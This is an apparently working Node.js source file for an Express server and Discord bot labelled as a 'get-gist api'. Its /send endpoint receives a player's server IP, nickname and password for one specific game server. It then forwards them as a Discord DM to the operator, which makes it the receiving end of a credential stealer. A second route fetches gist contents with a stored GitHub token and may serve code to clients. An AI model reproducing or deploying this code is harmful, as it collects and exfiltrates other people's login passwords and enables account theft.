const express = require("express")
const axios = require("axios")
const app = express()
require('dotenv').config()
const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js")
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
  partials: ['CHANNEL'], // Required to receive DMs
});

async function sendDM(userId, messageContent) {
  try {
    const user = await client.users.fetch(userId);
    await user.send(messageContent);
    console.log(`Sent a DM to ${user.tag}.`);
  } catch (error) {
    console.error(`Could not send DM to user with ID ${userId}:`, error);
  }
}

app.get("/getgist/:id", async (req, res) => {
  try {
    const response = await axios({
      method: "GET",
      url: "https://api.github.com/gists/" + req.params.id,
      headers: {
        "Authorization": "Bearer " + process.env.TOKEN
      },
      responseType: "json"
    })
    for (key in response.data.files) {
      res.send(response.data.files[key].content)
    }
  } catch (error) {
    res.send("Error")
  }
})

app.post("/send", async (req, res) => {
  try {
    if (!req.query.data) throw "Data query not found!"
    let data = req.query.data.replace(/\[SPASI\]/g, " ");
    data = data.replace(/\[ENTER\]/g, "\n");
    data = data.replace(/\[HASHTAG\]/g, "#");
    data = data.replace(/\[AND\]/g, "&");
    data = data.split("\n")
    data = data.map(el => el.split(">")[1])
    if (data[0] !== "51.79.162.211(7777)") return res.response({
      status: "not lunar"
    })
    const embed = new EmbedBuilder()
      .setColor(0xFFFF00)
      .setTitle(data[1])
      .addFields(
        { name: 'IP Address', value: data[0] },
        { name: 'Nickname', value: data[2] },
        { name: 'Password', value: data[3] },
      )
      .setTimestamp()
      .setFooter({ text: "Copyright get-gist api" })
    await sendDM(process.env.OWNER_ID, { embeds: [embed] })
    res.json({
      status: "lunar"
    })
  } catch (error) {
    res.json({
      status: "error",
      error
    })
  }
})

client.once("ready", () => {
  console.log("Discord bot is ready")
})

client.login(process.env.BOT_TOKEN);

app.listen(3000, () => console.log("App Listening to 3000"))
